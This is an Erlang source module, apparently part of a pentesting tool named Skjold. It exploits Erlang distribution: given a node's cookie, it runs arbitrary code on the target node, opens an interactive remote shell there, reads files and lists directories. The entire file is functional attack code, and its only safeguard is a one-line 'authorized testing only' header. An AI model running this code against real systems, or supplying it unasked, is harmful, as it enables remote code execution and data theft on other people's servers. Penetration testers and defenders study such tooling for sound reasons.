%%%-------------------------------------------------------------------
%%% @doc
%%% Exploitation module for Skjold pentesting tool.
%%% Provides RCE and post-exploitation capabilities.
%%% WARNING: For authorized security testing only.
%%% @end
%%%-------------------------------------------------------------------
-module(skjold_exploit).

-export([
    execute_command/4,
    spawn_shell/3,
    read_file/4,
    list_directory/4
]).

%%%===================================================================
%%% API
%%%===================================================================

%% @doc Execute arbitrary Erlang code on target node
-spec execute_command(string(), string(), atom(), string()) ->
    {ok, term()} | {error, term()}.
execute_command(Host, NodeName, Cookie, Command) ->
    TargetNode = list_to_atom(NodeName ++ "@" ++ Host),
    ensure_distributed(Cookie),

    case net_adm:ping(TargetNode) of
        pong ->
            try
                {ok, Tokens, _} = erl_scan:string(Command),
                {ok, Exprs} = erl_parse:parse_exprs(Tokens),
                Result = rpc:call(TargetNode, erl_eval, exprs, [Exprs, []], 10000),
                {ok, Result}
            catch
                _:Error -> {error, Error}
            end;
        pang ->
            {error, connection_failed}
    end.

%% @doc Spawn interactive shell on target
-spec spawn_shell(string(), string(), atom()) ->
    {ok, pid()} | {error, term()}.
spawn_shell(Host, NodeName, Cookie) ->
    TargetNode = list_to_atom(NodeName ++ "@" ++ Host),
    ensure_distributed(Cookie),

    case net_adm:ping(TargetNode) of
        pong ->
            ShellPid = spawn(fun() -> remote_shell_loop(TargetNode) end),
            {ok, ShellPid};
        pang ->
            {error, connection_failed}
    end.

%% @doc Read file from target node
-spec read_file(string(), string(), atom(), string()) ->
    {ok, binary()} | {error, term()}.
read_file(Host, NodeName, Cookie, FilePath) ->
    TargetNode = list_to_atom(NodeName ++ "@" ++ Host),
    ensure_distributed(Cookie),

    case net_adm:ping(TargetNode) of
        pong ->
            rpc:call(TargetNode, file, read_file, [FilePath], 10000);
        pang ->
            {error, connection_failed}
    end.

%% @doc List directory contents on target
-spec list_directory(string(), string(), atom(), string()) ->
    {ok, [string()]} | {error, term()}.
list_directory(Host, NodeName, Cookie, DirPath) ->
    TargetNode = list_to_atom(NodeName ++ "@" ++ Host),
    ensure_distributed(Cookie),

    case net_adm:ping(TargetNode) of
        pong ->
            rpc:call(TargetNode, file, list_dir, [DirPath], 10000);
        pang ->
            {error, connection_failed}
    end.

%%%===================================================================
%%% Internal functions
%%%===================================================================

ensure_distributed(Cookie) ->
    case node() of
        nonode@nohost ->
            Rand = rand:uniform(99999),
            ExploitNode = list_to_atom("skjold_exploit_" ++ integer_to_list(Rand)),
            net_kernel:start([ExploitNode, shortnames]),
            erlang:set_cookie(node(), Cookie);
        _ ->
            erlang:set_cookie(node(), Cookie)
    end.

remote_shell_loop(TargetNode) ->
    io:format("~n[*] Remote shell on ~p~n", [TargetNode]),
    io:format("[*] Type 'exit' to quit~n~n"),
    shell_loop(TargetNode).

shell_loop(TargetNode) ->
    case io:get_line("skjold> ") of
        "exit\n" ->
            io:format("~n[*] Exiting shell~n"),
            ok;
        eof ->
            ok;
        Line ->
            Command = string:trim(Line),
            case Command of
                "" ->
                    shell_loop(TargetNode);
                _ ->
                    execute_remote(TargetNode, Command),
                    shell_loop(TargetNode)
            end
    end.

execute_remote(TargetNode, Command) ->
    try
        {ok, Tokens, _} = erl_scan:string(Command ++ "."),
        {ok, Exprs} = erl_parse:parse_exprs(Tokens),
        case rpc:call(TargetNode, erl_eval, exprs, [Exprs, []], 10000) of
            {badrpc, Reason} ->
                io:format("Error: ~p~n", [Reason]);
            {value, Value, _} ->
                io:format("~p~n", [Value])
        end
    catch
        _:Error ->
            io:format("Parse error: ~p~n", [Error])
    end.
